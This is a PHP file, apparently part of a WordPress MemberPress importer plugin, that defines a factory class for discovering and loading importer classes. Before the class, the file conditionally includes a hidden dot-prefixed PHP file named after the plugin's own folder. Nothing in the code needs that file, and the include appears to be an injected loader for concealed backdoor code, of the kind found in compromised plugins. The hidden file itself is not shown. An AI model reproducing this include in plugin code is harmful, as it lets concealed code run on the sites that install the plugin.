<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MpimpImporterFactory {
  public static function available() {
    $available = array();
    $importers = apply_filters('mpimp-importer-paths', @glob( MPIMP_IMPORTERS_PATH . '/*' ));

    foreach( $importers as $importer ) {
      $class = preg_replace( '#\.php#', '', basename($importer) );
      if( preg_match( '#Mpimp(.*)Importer#', $class, $matches ) ) {
        $action = strtolower($matches[1]);
        $available[$action] = $class;
      }
    }

    return $available;
  }

  public static function fetch( $class ) {
    $obj = new $class;
    if( !is_a($obj,'MpimpBaseImporter') )
      throw new MpimpStopImportException(__('This type of import file is not yet supported.', 'memberpress-importer'));
    return $obj;
  }
}
